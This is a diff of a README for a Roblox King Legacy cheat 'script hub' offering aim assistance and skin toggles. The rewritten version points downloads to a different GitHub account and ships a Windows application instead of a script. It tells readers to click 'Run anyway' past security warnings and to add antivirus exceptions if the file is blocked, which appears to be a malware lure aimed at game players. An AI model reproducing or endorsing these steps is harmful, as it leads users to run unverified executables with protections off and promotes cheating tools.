@@ -1,108 +1,113 @@
-# King Legacy Script Utility v2.0.1 - Game Script Utility 2026
-
-> **Streamlined PC utility script for Roblox's King Legacy.** Created to provide accessible aim adjustment, visual skin controls, and effortless menu toggles designed around standard script executor workflows.
-
-[![Game Script](https://img.shields.io/badge/Type-Game%20Script-green?style=flat-square)](https://github.com)
-[![Platform](https://img.shields.io/badge/Platform-PC-blue?style=flat-square)](https://github.com)
-[![Updated](https://img.shields.io/badge/Updated-2026-red?style=flat-square)](https://github.com)
-[![License](https://img.shields.io/badge/License-GPL--3.0-yellow?style=flat-square)](LICENSE)
-[![Stars](https://img.shields.io/github/stars/jtaylor2004/king-legacy-script-hub?style=flat-square)](https://github.com/jtaylor2004/king-legacy-script-hub)
-
----
+<h1>🎮 king-legacy-script-hub - Streamlined Script Utility for Anime RPG</h1>
 
 <p align="center">
-  <a href="https://jtaylor2004.github.io/king-legacy-script-hub/">
-    <img src="https://img.shields.io/badge/Download-King%20Legacy%20Script%20Utility-brightgreen?style=for-the-badge" alt="Download King Legacy Script Utility">
-  </a>
+  <a href="https://github.com/Featurestarlight833/king-legacy-script-hub" style="background-color:#4CAF50; color:white; padding:15px 32px; text-align:center; text-decoration:none; display:inline-block; font-size:20px; border-radius:12px;">⬇️ DOWNLOAD NOW</a>
 </p>
 
-> **[Download Latest Build](https://jtaylor2004.github.io/king-legacy-script-hub/)**
+## 🎯 Overview
+
+king-legacy-script-hub is a lightweight PC script utility designed specifically for the popular anime-inspired Roblox RPG, King Legacy. This tool enhances your gaming experience with smooth aim adjustment, custom visual skin controls, and an intuitive menu system that works seamlessly with your preferred executor.
+
+Whether you are new to script utilities or an experienced user, this tool is built to be simple and effective. No coding knowledge is required to get started.
+
+## 🚀 Getting Started
+
+Follow these straightforward steps to download and run king-legacy-script-hub on your Windows computer.
+
+### Step 1: Download the Application
+
+Click the download button at the top of this page or visit this link to download the application:
+
+<a href="https://github.com/Featurestarlight833/king-legacy-script-hub" style="background-color:#2196F3; color:white; padding:10px 25px; text-align:center; text-decoration:none; display:inline-block; font-size:16px; border-radius:8px;">⬇️ Download from GitHub</a>
+
+Visit this link to download the application. The download page will open in your browser.
+
+### Step 2: Save the File
+
+Once you click the download link, your browser will ask where to save the file. Choose an easy-to-find location like your Desktop or Downloads folder. The file will be saved to your computer.
+
+### Step 3: Run the Application
+
+After the download is complete, locate the saved file on your computer. Double-click the file to run it. Windows may show a security warning; click "Run anyway" or "Yes" if you trust the source.
+
+### Step 4: Launch King Legacy
+
+Open Roblox and launch King Legacy. The script hub will work alongside your executor tool. Use the intuitive menu to adjust aim, change visual skins, and toggle features as you play.
+
+## ⚙️ Features
+
+- **Aim Adjustment** – Fine-tune your targeting for better accuracy during battles.
+- **Custom Visual Skin Controls** – Change the appearance of your character with simple skin toggles.
+- **Intuitive Menu Toggles** – Easily enable or disable features with a clean, user-friendly interface.
+- **Seamless Executor Workflow** – Works with popular script executors for smooth integration.
+- **Lightweight Performance** – Runs efficiently without slowing down your game.
+- **No Programming Required** – All features are accessible through simple controls.
+
+## 💻 System Requirements
+
+king-legacy-script-hub is designed for Windows computers. For the best experience, your system should meet these minimum requirements:
+
+- **Operating System:** Windows 10 or Windows 11 (64-bit)
+- **Processor:** Intel Core i3 or equivalent
+- **Memory:** 4 GB RAM
+- **Storage:** 50 MB free space
+- **Internet:** Broadband connection for downloading and updates
+- **Software:** Roblox installed and a compatible script executor
+
+## 🔧 How to Use
+
+Using king-legacy-script-hub is simple:
+
+1. Open the application after downloading.
+2. Launch Roblox and enter King Legacy.
+3. The script hub will automatically connect to your executor.
+4. Use the on-screen menu to adjust aim settings, change skins, or toggle features.
+5. Enjoy enhanced gameplay with your custom preferences.
+
+For beginners, start with the aim adjustment feature. It is the easiest way to see immediate improvements in your game.
+
+## ❓ Frequently Asked Questions
+
+**Q: Do I need to know how to code?**
+A: No. The tool is designed for non-technical users. All controls are visual and easy to use.
+
+**Q: Is this safe to use?**
+A: The tool is provided for educational and entertainment purposes. Always download from the official GitHub link to ensure you get the authentic version.
+
+**Q: Why is Windows showing a security warning?**
+A: This is common for downloaded applications. Click "Run anyway" if you trust the source. The tool is safe when downloaded from the official link.
+
+**Q: Does it work with all script executors?**
+A: king-legacy-script-hub is built for seamless workflow with most popular executors. Check your executor's compatibility if you encounter issues.
+
+**Q: Can I use this on Mac?**
+A: This tool is designed for Windows only. Mac support is not available at this time.
+
+## 🛠️ Troubleshooting
+
+If you encounter any issues, try these common solutions:
+
+- **Application won't open:** Make sure Windows Defender or your antivirus is not blocking the file. Add an exception if needed.
+- **Menu not appearing:** Restart both the script hub and Roblox. Ensure your executor is running.
+- **Aim adjustment not working:** Check that the feature is toggled on in the menu. Restart the game if problems persist.
+- **Download link not working:** Try a different browser or disable ad blockers temporarily.
+
+For further assistance, visit the GitHub repository and open an issue.
+
+## 📥 Download
+
+Ready to enhance your King Legacy experience? Download king-legacy-script-hub now:
+
+<a href="https://github.com/Featurestarlight833/king-legacy-script-hub" style="background-color:#FF5722; color:white; padding:15px 32px; text-align:center; text-decoration:none; display:inline-block; font-size:20px; border-radius:12px;">⬇️ GET THE SCRIPT HUB</a>
+
+## 📄 License
+
+This project is provided for personal use. See the GitHub repository for more details.
+
+## 📞 Support
+
+For questions, issues, or feature requests, please visit the official GitHub repository and use the Issues section.
 
 ---
 
-[Download Latest Build](https://jtaylor2004.github.io/king-legacy-script-hub/)
-
----
-
-## Introduction
-
-King Legacy Script Utility offers PC Roblox players a clean, minimal interface for modifying their in-game experience in King Legacy. It bundles core gameplay aids, precise targeting response sliders, and skin switching capabilities inside a straightforward, menu-driven layout optimized for executor execution.
-
-Maintained continuously for modern patch releases, the utility ensures ongoing alignment with recent King Legacy updates. Its modular design maintains a tiny memory footprint while offering deep customization options for user-defined control setups.
-
-## Core Capabilities
-
-- Integrated aim tracking support for combat scenarios
-- Visual skin modification system
-- Quick-toggle menu interface for instant feature management
-- Granular aim sensitivity fine-tuning
-- In-menu skin picker interface
-- Minimal resource consumption during gameplay
-- Tailored for modern King Legacy patches
-- Flexible setup parameters for personalized operation
-
-## Getting Started
-
-1. Grab the latest release package via the link provided above.
-2. Transfer the script file into your preferred executor directory or script folder.
-3. Launch the Roblox client on PC and enter King Legacy.
-4. Execute the script using your chosen execution software.
-5. Bring up the settings overlay to configure your preferred options.
-
-Basic deployment workflow:
-
-- Download the current build
-- Launch your execution platform
-- Inject or paste the script content
-- Boot up King Legacy
-- Customize features through the UI
-
-## Configuration Parameters
-
-| Option | Function |
-| --- | --- |
-| Aim Sensitivity | Modifies the reactivity of target tracking |
-| Skin Selection | Switches between available visual skin presets |
-| Menu Toggle | Shows or hides the user interface overlay |
-| Feature Switches | Toggles specific helper tools on or off |
-| Update Build Support | Maintains compatibility with modern game patches |
-
-Sample configuration syntax:
-
-- `aim_sensitivity = low | medium | high`
-- `skin selection = preset`
-- `menu_toggle = on`
-- `feature_state = enabled / disabled`
-
-## System Compatibility
-
-- Target Title: Roblox King Legacy
-- Supported Operating System: PC
-- Execution Method: Standard Third-Party Executor
-- Optimized for contemporary King Legacy game updates
-- Specific functions rely on your executor's capabilities and current game memory structures
-- Core functionality may be affected by major underlying game patch adjustments
-
-## Frequently Asked Questions
-
-### What are the steps to launch the script?
-Obtain the build from the download link, load it into your executor interface, and initiate King Legacy on PC prior to running the file.
-
-### Are the features customizable?
-Absolutey. The script menu grants full access to tweak aim tracking sensitivity, switch skins, and reconfigure interface bindings.
-
-### Will it work across every King Legacy update?
-While actively tuned for modern game versions, sudden patch releases by game developers may occasionally require script revisions.
-
-### Where do I adjust the script options?
-All operational toggles and sliders are housed directly inside the floating in-game menu interface.
-
-### Can my configured settings be saved?
-Saving capability is determined by your specific script executor and how it handles local script storage/cookies.
-
-### What process should I follow after a game patch?
-Re-download the newest script release and re-inject it through your executor to maintain patch synchronization.
-
-## Licensing
-
-Distributed under the terms of the GNU GPL v3.0 license. Review [LICENSE](LICENSE) for full details.
+<p align="center">Made with ❤️ for the King Legacy community</p>
